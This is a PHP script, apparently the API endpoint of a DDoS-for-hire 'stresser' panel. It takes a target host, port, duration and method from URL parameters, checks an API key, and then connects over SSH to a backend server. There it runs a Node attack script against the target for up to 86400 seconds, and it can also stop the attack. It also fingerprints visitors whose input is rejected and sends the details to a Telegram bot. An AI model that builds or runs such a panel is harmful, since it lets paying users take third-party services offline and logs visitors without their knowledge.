<?php

// By Nephlm (Version 1.1)

$server_ip = "Server IP";
$server_pass = "Server Password";
$server_user = "Server Login (example: root)";

// Get user IP address
$user_ip = $_SERVER['REMOTE_ADDR'];

// Get user agent
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get browser name and version
$browser = get_browser(null, true);

// Get user fingerprint
$fingerprint = md5(uniqid());

// Validate user input
$key = filter_input(INPUT_GET, 'key', FILTER_SANITIZE_STRING);
$host = filter_input(INPUT_GET, 'host', FILTER_SANITIZE_URL);
$port = filter_input(INPUT_GET, 'port', FILTER_SANITIZE_NUMBER_INT);
$time = filter_input(INPUT_GET, 'time', FILTER_SANITIZE_NUMBER_INT);
$method = filter_input(INPUT_GET, 'method', FILTER_SANITIZE_STRING);

// Escape special characters in user input
$key = htmlspecialchars($key);
$host = htmlspecialchars($host);
$port = htmlspecialchars($port);
$time = htmlspecialchars($time);
$method = htmlspecialchars($method);

// Check if the $key variable contains any special characters that are not allowed in a string
if (preg_match('/[^a-zA-Z0-9_]/', $key)) {
    // Log the attempt to inject code
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = get_browser(null, true);
    $fingerprint = md5($ip_address . $user_agent);
    $log_message = "Code injection attempt from IP address: $ip_address, User Agent: $user_agent, Browser: $browser, Fingerprint: $fingerprint";

    // Send the log message to a Telegram bot
    $bot_token = "TELEGRAM_BOT_TOKEN";
    $chat_id = "CHAT_ID";
    $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($log_message);
    file_get_contents($url);
    
    echo "Nice try.";
    exit;
}

// Check if the $host variable contains any special characters that are not allowed in a URL
if (preg_match('/[^a-zA-Z0-9_:\/\.\?=&]/', $host)) {
    // Log the attempt to inject code
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = get_browser(null, true);
    $fingerprint = md5($ip_address . $user_agent);
    $log_message = "Code injection attempt from IP address: $ip_address, User Agent: $user_agent, Browser: $browser, Fingerprint: $fingerprint";

    // Send the log message to a Telegram bot
    $bot_token = "TELEGRAM_BOT_TOKEN";
    $chat_id = "CHAT_ID";
    $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($log_message);
    file_get_contents($url);
    
    echo "Nice try.";
    exit;
}

// Check if the $port and $time variables contain any characters that are not numbers
if (preg_match('/[^0-9]/', $port) || preg_match('/[^0-9]/', $time)) {
    // Log the attempt to inject code
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = get_browser(null, true);
    $fingerprint = md5($ip_address . $user_agent);
    $log_message = "Code injection attempt from IP address: $ip_address, User Agent: $user_agent, Browser: $browser, Fingerprint: $fingerprint";

    // Send the log message to a Telegram bot
    $bot_token = "TELEGRAM_BOT_TOKEN";
    $chat_id = "CHAT_ID";
    $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($log_message);
    file_get_contents($url);

    echo "Nice try.";
    exit;
}

// Ensure required parameters are present and valid
if (empty($key) || empty($host) || empty($port) || empty($time) || empty($method)) {
    die('Error: Some of the required parameters were not specified or contain invalid values!');
}

// Authenticate user
$authorized_keys = array("key"); // - Here ur api key
if (!in_array($key, $authorized_keys)) {
    die('Error: Invalid API key!');
}

// Check port and time values
if ($port > 65535){
    die('Error: no port greater than 65535 exists!');
}	
if ($time > 86400){
    die('Error: The attack can not be more than 86400 seconds!');
}  
if(!ctype_digit($time)){
    die('Error: the time is not in numbers!');
}
if(!ctype_digit($port)){
    die('Error: the port is not specified in numbers!');
}

// Set an array of allowed methods
$allowed_methods = array("Name", "stop");

// Check if the specified method is in the array of allowed methods
if (!in_array($method, $allowed_methods)) {
    die('Error: The specified method is not allowed!');
}

// Set the command based on the specified method
if ($method == "Name") {
    $command = "cd /root/ && node urname.js $host $time";
}

// Set the command to stop the attack if the "stop" method is specified
if ($method == "stop") {
    $command = "pkill -f $host";
}

// Connect to the server
if (!function_exists("ssh2_connect")) die("Error: SSH2 is not installed on your server!");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: it looks like dedi fucked up :D";
} else {
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: invalid login or password!";
    } else {
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: Your server was not able to execute the method file or its dependencies";
        } else {    
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
            header("Content-Type: text/plain");
printf("The request was successfully completed!\nTarget: %s\nPort: %d\nTime: %d\nMethod: %s\n", $host, $port, $time, $method);
        }
    }
}

?>
